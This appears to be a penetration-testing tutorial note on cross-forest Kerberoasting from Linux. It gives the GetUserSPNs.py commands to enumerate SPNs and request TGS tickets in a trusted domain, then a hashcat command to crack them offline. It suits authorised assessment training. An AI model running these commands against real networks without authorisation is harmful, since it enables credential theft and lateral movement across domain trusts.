# Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
Kerberos-based attacks—such as **Kerberoasting** and ASREPRoasting—can be executed across domain or forest trusts, depending on the trust direction.
If you're operating within a domain that has an inbound or **bidirectional** trust with another domain or forest, you may be able to leverage that trust to launch attacks in the trusted domain.
If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the DOM.LOCAL domain, we see one SPN entry for the mssqlsvc account.

## Cross-Forest Kerberoasting
### Using GetUserSPNs.py
```shell
GetUserSPNs.py -target-domain DOM.LOCAL CORP.LOCAL/wley
```
<img width="2281" height="325" alt="image" src="https://github.com/user-attachments/assets/2ddc6e1b-ac0a-47d4-927e-e27693645c18" />

#### Get TGS ticket 
Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.
```shell
GetUserSPNs.py -request -target-domain DOM.LOCAL CORP.LOCAL/wley
```
<img width="2284" height="442" alt="image" src="https://github.com/user-attachments/assets/0d1d5adb-70b6-4bcf-bac4-441a3b04b32b" />

### Crack the hashes
```shell
sudo hashcat -m 13100 hash.hash /usr/share/wordlists/rockyou.txt
```


